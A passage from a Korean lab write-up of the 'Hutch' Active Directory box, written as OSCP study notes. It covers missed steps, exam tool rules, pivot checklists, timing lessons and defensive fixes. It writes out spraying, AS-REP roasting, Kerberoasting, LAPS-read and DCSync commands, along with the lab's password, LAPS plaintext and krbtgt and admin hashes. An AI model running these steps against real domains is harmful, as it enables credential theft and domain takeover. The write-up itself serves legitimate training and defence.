
### 6-8. 개작 과정에서 **반증된** 서술 — 지우지 않고 남긴다

이 노트는 2026-08-20에 Kali 산출물·BloodHound JSON·pyLAPS 소스·도구 실측과 대조해 전면 개작됐다.

| # | 원본의 서술/표기 | 반증 | 근거 |
|---|---|---|---|
| 1 | 프론트매터 태그에 **`tech/web/webdav`** | **반증됨.** WebDAV를 **시도한 기록이 전혀 없다.** nmap NSE가 «메서드 목록»을 보여준 것뿐이다 | 노트 전체에 `davtest`·`cadaver`·`curl -X PUT`·디렉터리 브루트포싱이 하나도 없다 (§6-4) |
| 2 | 프론트매터 태그에 **`tech/ad/asreproast`** | **반증됨.** 실행은 했으나 **0건**이었고 풀이에 기여하지 않았다. 표준의 판단 기준은 *"내가 이 박스를 뚫는 데 실제로 사용했는가"* | §2-1 — 전원 `doesn't have UF_DONT_REQUIRE_PREAUTH set` |
| 3 | 프론트매터 태그에 **`tech/cred/crack`** | **반증됨.** `hashcat`·`john` 을 돌린 기록이 없다. **크랙 없이** 평문·해시를 그대로 썼다 | 노트 전체 |
| 4 | 기록된 `ldapsearch -x -s base` 로는 기록된 `Enter LDAP Password:` 가 **나오지 않는다** | 실측으로 확인. `-W` 가 있어야 프롬프트가 뜬다. **결과(익명 바인드)에는 영향 없음** | §1-2·§6-2 |
| 5 | `description` grep 결과를 **완전한 값처럼** 제시 | **LDIF 접힘으로 잘려 있었다.** 실제 값은 `... Please change on next login.` | BloodHound `users.json` 의 `description` 속성 (§2-2) |
| 6 | LAPS 비밀번호가 **어느 계정의 것인지** 설명 없음 | **도메인 Administrator의 것**임을 NT 해시 계산으로 확정 | `MD4(UTF-16LE('+CS0-.gm5l4o-['))` = `d1722dc7…` = §4-4의 **도메인** Administrator 해시 (§2-4) |
| 7 | 익명 LDAP에 **관리자 계정이 안 보이는 것**에 설명 없음 | `adminCount=1` 인 3개(`Administrator`·`krbtgt`·`domainadmin`)가 **AdminSDHolder로 DACL이 덮여** 상속이 끊겼기 때문. 18−3−1=14 로 산술이 맞는다 | `users.json` 의 `admincount` 속성 (§1-3) |
| 8 | nmap IP(`192.168.178.122`)와 이후 IP(`192.168.216.122`)가 **설명 없이 혼재** | 오타가 아니라 **리버트로 인한 IP 재배정** | 타겟 자신의 `ipconfig` 가 `192.168.216.122` 를 보고한다 (§5·§6-1) |

> [!note] 원본이 **틀리지 않았던 것**도 기록해 둔다
> 명령어 원문·해시 값·플래그 값·LAPS 평문·스크린샷은 **전부 정확했다.** 특히 §2-4의 해시 대조가 성립한다는 것은 **원본에 기록된 LAPS 평문과 덤프 해시가 «둘 다» 정확했다**는 강한 증거다 — 둘 중 하나라도 틀렸으면 MD4가 일치할 수 없다.
> 개작이 바꾼 것은 **«설명»과 «분류»** 이지 «관측»이 아니다.

### 6-9. **`fmcsorley` 로는 셸을 시도조차 하지 않았다** — `local.txt` 미확보와 직결된다

`fmcsorley:CrabSharkJellyfish192` 를 얻은 뒤 한 것은 **SMB 공유 열거(§3-3)와 BloodHound(§4-1) 둘뿐**이다. **그 계정으로 WinRM/RDP를 시도한 기록이 없다.**

| 시도했어야 할 것 | 왜 | 비용 |
|---|---|---|
| `nxc winrm <IP> -u fmcsorley -p 'CrabSharkJellyfish192'` | **`Remote Management Users` 멤버면 그 자리에서 대화형 셸**이다. [[Resourced]]의 `L.Livingstone` 이 정확히 그 경우였다 | 5초 |
| `nxc ldap <IP> -u .. -p .. --users --admin-count` | 익명으로 안 보이던 `Administrator`·`domainadmin` 이 **인증하면 보인다**(§1-3) | 5초 |
| `impacket-GetUserSPNs -request` | Kerberoast. 이 도메인엔 대상이 없었지만 **확인은 했어야 한다** | 10초 |
| `nxc smb <IP> -u .. -p .. --pass-pol` | §3-1의 196회 스프레이가 **얼마나 위험했는지** 사후에라도 알 수 있었다 | 5초 |

> [!danger] 이 누락이 §5의 **`local.txt` 불확실성**을 만들었다
> 만약 이 박스에 `local.txt` 가 있다면 그것은 **`C:\Users\fmcsorley\Desktop`** 이다. 그런데 `fmcsorley` 셸을 열어본 적이 없고, Administrator 셸에서도 `C:\Users` 목록을 확인하지 않았다.
> **자격증명을 얻으면 «셸이 되는지»를 반드시 확인하라** — 플래그가 거기 있을 수 있고, 없더라도 **로컬 열거로 다음 단계가 나온다.**

> [!note] Windows 셸을 잡자마자 칠 명령 — 리눅스 반사신경은 **전부 무용지물**이다
> | 리눅스 | **Windows 대응** | 무엇을 찾는가 |
> |---|---|---|
> | `id` | `whoami /all` | SID · 그룹 · **특권을 한 번에** |
> | `sudo -l` | **`whoami /priv`** | `SeImpersonate`·`SeBackup`·`SeRestore`·`SeDebug` |
> | `find / -perm -4000` | 서비스 바이너리 ACL · `icacls` | 쓰기 가능한 실행 파일 |
> | `crontab -l` | `schtasks /query /fo LIST /v` | 예약 작업 |
> | `netstat -tulpn` | `netstat -ano` | 로컬에만 열린 포트 |
> | — | `Get-ChildItem C:\Users -Force` | **다른 사용자 프로필 (= 플래그 위치)** |
> | — | `cmdkey /list` | 저장된 자격증명 |
> | — | `Get-ChildItem -Recurse -Force -Include *.kdbx,*.config,unattend.xml` | 파일 안의 비밀 |
>
> DC라면 추가로: **`net group "Backup Operators" /domain`** · **`net group "Remote Management Users" /domain`** · **`net accounts /domain`**(잠금 정책을 셸에서 직접 확인).
> **`whoami /priv` 가 Windows 박스의 «`sudo -l`»** 이다 — [[Squid]] 참조.

> [!warning] **리버스셸이 안 붙으면 뭘 의심하나 — 이 박스에는 애초에 «없었다»**
> Hutch는 리버스셸도 페이로드도 웹셸도 쓰지 않았다. **AD 박스의 표준 전개가 그렇다** — 자격증명을 얻어 **정식 프로토콜(WinRM·SMB·RPC·LDAP)로 «로그인»** 한다.
> 그래서 아웃바운드 차단·AV 탐지·TTY 업그레이드를 고민할 일이 없다. **대신 막힘의 원인 목록이 통째로 다르다**:
>
> | 웹/리눅스 박스 | **AD 박스** |
> |---|---|
> | 아웃바운드 포트 차단 | **시계 오차**(`KRB_AP_ERR_SKEW`) |
> | WAF·인라인 차단 | **이름 해석**(FQDN vs IP, `/etc/hosts`) |
> | 페이로드 AV 탐지 | **계정 상태**(비활성·만료·잠김 — §2-6의 `STATUS_*` 사전) |
> | 셸이 죽음(TTY 없음) | **로그온 유형 거부**(그룹 멤버십 부족 — WinRM은 되는데 SMB는 안 되는 식) |
> | 잘못된 LHOST | **박스 IP 변경**(리버트 — §6-1) |
>
> **§7-3의 «넷부터 확인하라»가 이 표의 요약이다.**

### 6-10. **셸 히스토리를 잃었다** — 무엇이 복원됐고 무엇이 영원히 사라졌는가

이 박스의 작업은 2026-05-14~15인데, `~/.zsh_history`(2552행)에는 **그 구간이 남아 있지 않다.** 버퍼가 밀려 나갔다. 같은 파일에 [[Resourced]](7월 3~6일) 구간은 100행 넘게 살아 있다.

| 복원할 수 있었던 것 | 출처 | 복원 못 한 것 |
|---|---|---|
| 명령·출력·플래그·해시·IP | **원본 노트 본문** | **실패한 시도의 횟수와 순서** |
| ACE·그룹·`adminCount`·`haslaps` | **BloodHound JSON 7개** | 어떤 BloodHound 쿼리를 돌렸는가 |
| 진행 시각(분 단위) | **스크린샷 파일명 + 파일 mtime** | 각 단계 사이에 무엇을 시도했는가 |
| LAPS 속성명·필터 | **`~/git/pyLAPS/pyLAPS.py` 소스** | pyLAPS를 왜 골랐는가(`nxc -M laps` 대신) |
| 도구 플래그 동작 | **Kali에서 재실행** | — |

> [!danger] 그래서 [[Resourced]] 의 §6은 «실패 12건»을 명령 단위로 적을 수 있었고, 이 노트의 §6은 그럴 수 없다
> [[Resourced]] §6-1·§6-2는 `smbclient` 인용을 **8번 틀린 기록**과 `nxc-sweep` 을 **5번 잘못 쓴 기록**을 그대로 인용한다. 그 구간의 history가 살아 있었기 때문이다.
> 이 노트는 **«없는 시행착오를 지어내지 않기 위해»** §6을 관측 가능한 것으로만 채웠다. 빈칸이 학습을 방해하지는 않지만, **틀린 단정은 다른 박스에서 오판을 만든다.**
>
> **그래서 실무 규율은 이것이다 — 박스를 시작할 때 세션을 기록으로 남겨라.**
> ```bash
> mkdir -p ~/PG/<박스>/ && cd ~/PG/<박스>
> script -f -a session.log            # 모든 입출력을 파일로. -f 는 즉시 flush
> # (또는) tmux 안에서
> tmux pipe-pane -o 'cat >> ~/PG/<박스>/pane.log'
> ```
> **비용 5초, 회수는 «노트를 다시 쓸 수 있는가» 전체다.**
> 최소한 이것만이라도 습관으로:
> ```bash
> history -100 > ~/PG/<박스>/history.txt      # 박스를 끝낼 때마다
> ```

### 6-11. 하지 않았지만 «했어야 했나» 검토한 경로

**아래는 이 박스에서 실행하지 않았다.** 출력이 없는 이유다.

- **Kerberoasting** — `impacket-GetUserSPNs -request` 를 돌린 기록이 없다. `fmcsorley` 자격증명을 얻은 직후가 적기였다. BloodHound 덤프로 사후 확인하면 **일반 사용자에 SPN이 걸린 계정은 보이지 않았다** — 결과적으로 소득이 없었을 것이다. **[가정]**
- **공통 해시 `c11f1141ab4c1e825a11f15836e6978f` 크랙** — 12명이 공유하는 비밀번호다. `hashcat -m 1000` 로 깼다면 평문 하나가 12명분이 된다. **다른 박스로 재사용될 수 있는 자산**이므로 실전이라면 반드시 시도할 값이다
- **`domainadmin`(RID 1116) 계정** — Domain Admins 멤버이고 해시(`8730fa0d1014eb78c61e3957aa7b93d7`)도 확보했다. **익명 열거에서는 안 보였던 계정**이므로(§1-3), "숨어 있던 관리자 계정"의 좋은 사례다
- **`krbtgt` 골든 티켓** — `3c37d961d2fbbc1eb9e4d09f145ad361` 을 갖고 있으므로 가능했다. 이미 도메인 관리자였으므로 **불필요했다**
- **WebDAV / IIS** — §6-4

---

## 7. OSCP 시험 관점

### 7-1. 이 박스에서 쓴 도구의 시험 적법성

| 도구 | 판정 | 근거 |
|---|---|---|
| `nmap` (`-sCV -A`) | **허용** | 열거 도구 |
| `ldapsearch` | **허용** | 표준 LDAP 클라이언트. **외부 도구가 아니어서 가장 안전** |
| **`kerbrute`** | **허용** | 사용자 열거 전용. **익스플로잇 단계가 없다** |
| `netexec`/`nxc` | **허용** | 열거·인증 |
| **`BloodHound` / `bloodhound-python`** | **허용** | 순수 열거·그래프 분석 |
| `impacket-*` (`GetNPUsers`·`secretsdump`) | **허용** | — |
| `pyLAPS` | **허용** | LDAP 속성을 읽는 스크립트. 취약점을 «발견»하지 않는다 |
| `smbmap` | **허용** | 공유 열거 |
| `evil-winrm` | **허용** | WinRM 클라이언트 |
| **Metasploit** | 1대 한정 — **쓰지 않았다** | — |
| **`sqlmap`** | **금지** — 해당 없음 | 웹/DB 요소를 쓰지 않았다 |

> [!warning] 과잉 금지 판정을 하지 마라
> 규정의 금지 대상은 *"automatically discovering **and exploiting** vulnerabilities … without effort or enumeration"* 인 도구다. **kerbrute·BloodHound·nxc·impacket·pyLAPS는 전부 허용**이다.
> 대량 취약점 스캐너(Nessus/OpenVAS/NeXpose/Canvas/Core Impact/SAINT)와 `sqlmap` 계열만 금지다.

### 7-2. 이 자격증명으로 다음에 무엇을 시도하는가 — 피벗 체크리스트

**A. 도메인 사용자 «목록»만 있고 비밀번호가 없을 때**

1. **`kerbrute userenum` 으로 유효 사용자만 남긴다** — 계정을 잠그지 않는다
2. **AS-REP Roast** — `impacket-GetNPUsers <domain>/ -usersfile users.txt -format hashcat -dc-ip <IP>`. **자격증명 0으로 되는 유일한 크랙 경로**
3. **익명 LDAP으로 `description`/`info` 전수 조회** — 이 박스의 정답
4. **사용자명 = 비밀번호 / 계절+연도 / 회사명+숫자** 를 **잠금 정책 확인 후** 스프레이
5. **`Guest`/`anonymous` 로 SMB·LDAP 널 세션** — `nxc smb <IP> --users --shares --pass-pol`

**B. 저권한 도메인 자격증명 하나를 얻었을 때** (`fmcsorley:CrabSharkJellyfish192`)

1. **BloodHound `-c all` 즉시 실행** — 이후 판단의 지도
2. **BloodHound에서 «아웃바운드 엣지»를 직접 확인** — `ReadLAPSPassword`·`ReadGMSAPassword`·`GenericAll`·`GenericWrite`·`WriteDacl`·`AddKeyCredentialLink`·`ForceChangePassword`. **Shortest Path 쿼리만 믿지 마라**(이 박스가 그 함정이다)
3. **`nxc ldap -M laps`** — LAPS 읽기 권한이 있는지 즉시 확인
4. **`nxc ldap -M maq`** — MachineAccountQuota. RBCD 가능성([[Resourced]] 경로)
5. **Kerberoasting** — `impacket-GetUserSPNs -request -dc-ip <IP> <domain>/<user>:<pass>`
6. **공유 전수 + SYSVOL의 GPP `cpassword`** — `-M gpp_password`
7. **다른 프로토콜로 같은 자격증명** — `nxc winrm/rdp/mssql/ssh`. 서비스마다 요구 그룹이 다르다
8. **`--pass-pol` 로 잠금 정책을 확보해 두면** 이후 스프레이 전략이 정해진다

**C. LAPS 평문을 얻었을 때** (`+CS0-.gm5l4o-[`)

1. **도메인 인증과 로컬 인증을 «둘 다» 시도한다** — `-d <domain>` / `--local-auth`. **어느 쪽인지는 대상이 DC냐 멤버 서버냐에 달렸다**(§2-4)
2. **`(Pwn3d!)` 를 확인했으면 곧바로 `secretsdump`** — 가능하면 `-just-dc-ntlm`(조용하다)
3. **`ms-Mcs-AdmPwdExpirationTime` 을 확인하라** — 만료가 임박했으면 **평문이 곧 무효**가 된다. **해시를 먼저 확보**해 두는 것이 안전하다
4. **다른 컴퓨터의 LAPS도 읽히는지** 확인 — `pyLAPS --action get` 은 **읽을 수 있는 전부**를 나열한다. 도메인에 서버가 여럿이면 여기서 횡적 이동이 시작된다

**D. 도메인 해시 전체를 얻었을 때**

1. **`krbtgt` 는 마지막 카드** — 골든 티켓. 시끄럽고 되돌리기 어렵다
2. **머신계정 해시로 실버 티켓** — 특정 서비스만 조용히
3. **중복 해시를 찾아라** — 이 박스처럼 12명이 같으면 **하나 크랙 = 12명 확보**:
   ```bash
   cut -d: -f4 dump.txt | sort | uniq -c | sort -rn | head
   ```
4. **AES 키를 챙긴다** — RC4가 꺼진 도메인에서는 NT 해시가 아니라 `-aesKey`가 열쇠다
5. **다른 박스에 재사용** — 시험 AD 세트는 도메인이 이어져 있다. 평문·해시를 전부 한 파일로 모아 둔다

### 7-3. 시간 배분 — 어디서 손절했어야 하는가

| 구간 | 실제 | 적정 | 손절 기준 |
|---|---|---|---|
| nmap `-p-` | ~2분 | 2분 | — |
| LDAP RootDSE → 사용자 열거 | 5/14 16:17 → 5/15 10:52 (하루 걸침) | **10분** | `ldapsearch -x -s base` 가 되면 곧바로 `-b <baseDN>` 서브트리. **안 되면 즉시 SMB/kerbrute로 전환** |
| kerbrute → AS-REP roast | ~20분 | **10분** | AS-REP 0건이면 **미련 없이 접어라.** 다시 시도해도 결과는 같다 |
| `description` 발견 → 스프레이 | ~3시간(11:14→14:28, 다른 작업 포함) | **20분** | `description` 전수 조회는 **AS-REP 직후 곧바로** 했어야 한다. 이 박스에서 가장 늦게 도착한 조사다 |
| BloodHound → LAPS | ~7분(14:28→14:35) | 10분 | `ReadLAPSPassword` 엣지를 보면 **1분 안에 pyLAPS/`-M laps`** |
| LAPS → DCSync → 플래그 | ~11분(14:35→14:52) | 15분 | — |

> [!danger] 이 박스의 교훈 — **`description` 전수 조회를 «맨 앞»으로 옮겨라**
> 실제로는 AS-REP roast와 사용자명 스프레이에 시간을 쓴 뒤에야 `description`을 봤다. **순서가 뒤집혀 있었다.**
> **LDAP이 익명으로 읽히는 순간, 가장 먼저 할 일은 `description`·`info` 전수 조회다.** 비용 10초, 회수는 이 박스 전체다.
> ```bash
> ldapsearch -x -H ldap://<IP> -b '<baseDN>' '(objectClass=*)' description info comment \
>   | sed -e ':a' -e '$!N;s/\n //;ta' -e 'P;D' | grep -iE 'description|info|comment'
> ```

> [!danger] AD 박스에서 30분 이상 막혔다면 **이 넷부터 확인하라 — 취약점을 더 찾지 마라**
> 1. **시계** — `sudo rdate -n -p <DC>` (`KRB_AP_ERR_SKEW`)
> 2. **이름 해석** — `getent hosts <FQDN>` (`/etc/hosts`)
> 3. **IP** — 리버트로 바뀌지 않았는가 (§6-1)
> 4. **BloodHound의 «아웃바운드 엣지»** — Shortest Path에 안 나오는 엣지가 정답인 경우가 있다 (이 박스)

### 7-4. 자동 도구 없이 같은 결과를 얻는 법

| 자동 | 수동 대안 |
|---|---|
| `kerbrute userenum` | `impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <IP>` — 존재하지 않는 사용자는 `KDC_ERR_C_PRINCIPAL_UNKNOWN`으로 구분된다 |
| `nxc --users` | `ldapsearch`(이 박스) · `impacket-lookupsid`(RID 사이클링) · `rpcclient -U '' -N <IP>` → `enumdomusers` |
| `pyLAPS` | `ldapsearch … '(&(objectCategory=computer)(ms-MCS-AdmPwd=*))' ms-Mcs-AdmPwd` (§4-2) |
| `bloodhound-python` | 한 개체의 ACL만 필요하면 `nxc ldap -M daclread`. 전체를 손으로 하는 것은 비현실적이며, **BloodHound는 허용 도구**이므로 굳이 피할 이유가 없다 |
| `nxc` 스프레이 | `for u in $(cat users.txt); do smbclient -L //<IP> -U "$u%<pass>" 2>&1 \| grep -q 'Sharename' && echo "[+] $u"; done` — **느리고 잠금 제어가 없다.** nxc가 훨씬 안전하다 |
| `secretsdump` (DCSync) | `mimikatz "lsadump::dcsync /domain:hutch.offsec /user:krbtgt"` (Windows 측에서) |

---

## 8. 방어 관점

| # | 결함 | 조치 |
|---|---|---|
| 1 | **`description` 필드에 평문 비밀번호** (`fmcsorley`) | 이 속성은 **인증된 사용자 전원이 읽고, 이 박스에서는 «익명»에게도 읽혔다.** 정기 감사: `Get-ADUser -Filter * -Properties Description,Info \| Where-Object {$_.Description -match 'pass\|pwd\|set to'}` |
| 2 | **익명 LDAP 오퍼레이션 허용** | `dSHeuristics` 7번째 문자를 기본값으로 되돌린다(익명 차단). `EveryoneIncludesAnonymous`도 확인. **RootDSE 노출은 정상이지만 서브트리 조회는 아니다** |
| 3 | **`fmcsorley`(일반 사용자)가 DC의 `ms-Mcs-AdmPwd` 읽기 권한 보유** | `Find-AdmPwdExtendedRights -Identity <OU>` 로 감사하고 불필요한 주체를 제거한다. **LAPS 읽기 권한은 헬프데스크 등 «필요한 그룹»에만** |
| 4 | **도메인 컨트롤러에 LAPS 배포** | DC는 LAPS 대상이 아니다. 결과적으로 **도메인 Administrator의 비밀번호가 LDAP 속성에 평문으로 노출**됐다(§2-4). DC는 LAPS 정책 범위에서 제외한다 |
| 5 | **사용자 12명이 동일한 비밀번호** | 초기 비밀번호를 계정마다 유일하게 발급하고 **최초 로그온 시 변경 강제**(`pwdLastSet=0`). 중복 탐지: 덤프에서 `cut -d: -f4 \| sort \| uniq -c` |
| 6 | **계정 잠금 정책 부재** | §3-1의 196회 실패가 아무 계정도 잠그지 않았다. **임계값·관찰 창을 설정**하고, 스프레이 탐지를 위해 **이벤트 4625를 상관 분석**한다 |
| 7 | 탐지 | **4662**(DCSync — DS-Replication GUID) · **4624/4625**(스프레이 패턴: 짧은 시간에 다수 사용자 실패) · **4768/4771**(kerbrute의 AS-REQ) · **LAPS 속성 읽기 감사**(`ms-Mcs-AdmPwd`에 SACL을 걸어 4662로 기록) |
| 8 | **1세대 LAPS 사용** | `ms-Mcs-AdmPwd` 는 **평문 저장**이다. **Windows LAPS로 이전**해 암호화 저장(`msLAPS-EncryptedPassword`)을 쓴다 |

---

## 9. 참고 자료

- **LAPS** — [Microsoft LAPS(1세대)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) · [Windows LAPS(2023+)](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview) · 속성 비교는 §2-3 표
- **pyLAPS** — https://github.com/p0dalirius/pyLAPS (Kali: `~/git/pyLAPS/pyLAPS.py` — **디스크에 있으므로 그게 1차 사료다**)
- **AdminSDHolder / SDProp** — [Microsoft: Protected Accounts and Groups in AD](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn535499(v=ws.11))
- **DCSync / MS-DRSR** — [MS-DRSR: IDL_DRSGetNCChanges](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/) · 확장 권한 GUID는 §2-5 표
- **AS-REP Roasting** — [RFC 4120 §3.1](https://www.rfc-editor.org/rfc/rfc4120) (사전인증) · `UF_DONT_REQUIRE_PREAUTH` = `0x400000`
- **kerbrute** — https://github.com/ropnop/kerbrute (Kali: `~/PG/Hutch/kerbrute_linux_386`, `~/git/kerbrute/`)
- **LDAP 비트 매칭 규칙** — `LDAP_MATCHING_RULE_BIT_AND` = `1.2.840.113556.1.4.803`
- **LDIF 줄 접힘** — [RFC 2849](https://www.rfc-editor.org/rfc/rfc2849) §2 (§2-2의 함정)
- **OSCP 시험 규정** — [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)

---

## 남긴 흔적 / 정리 체크리스트

| 흔적 | 위치 | 정리 방법 |
|---|---|---|
| **`RemoteRegistry` 서비스가 시작된 채 방치** | HUTCHDC | `sc.exe \\HUTCHDC stop RemoteRegistry` (§6-5). **`-just-dc-ntlm` 을 썼다면 애초에 안 생긴다** |
| 스프레이 실패 로그 **196 + 14건** | DC 보안 이벤트 4625 | 지울 수 없다. **실전이라면 사전에 고객과 합의된 범위인지 확인** |
| DCSync 호출 | 이벤트 4662 (복제 GUID) | 지울 수 없다 |
| kerbrute AS-REQ 14건 | 이벤트 4768/4771 | 지울 수 없다 |
| Kali 측 도메인 해시 덤프 | 로컬 | **도메인 전체 자격증명**이다. 암호화 보관 또는 파기 |

## 관련 노트

- [[Resourced]] — **짝을 이루는 박스.** 같은 Server 2019 단일 DC, 같은 "텍스트 필드에 적힌 비밀번호", 같은 "DC 컴퓨터 객체에 붙은 ACE"(거기서는 `GenericAll` → RBCD). **§0의 대조표를 보고 연달아 읽어라**
- [[Vault]] — AD 종합. DCSync · `SeBackupPrivilege` · GPO 남용
- [[Heist]] — NTLM 릴레이. 이 박스도 **SMB 서명 강제**라 그 경로가 막혀 있다는 대조군
- [[Nagoya]] — Kerberoast · AS-REP roast가 **실제로 성공**하는 AD. 이 박스에서 0건이었던 경로를 거기서 본다
- [[Butch]] — **웹셸로 읽은 플래그는 0점**이라는 규정 원문의 출처
- [[Crane]] · [[Squid]] — "응답이 성공을 뜻하지 않는다"(§1-1의 WebDAV 메서드 목록이 같은 함정)
- [[_WRITEUP-STANDARD]] · [[_STATUS]]
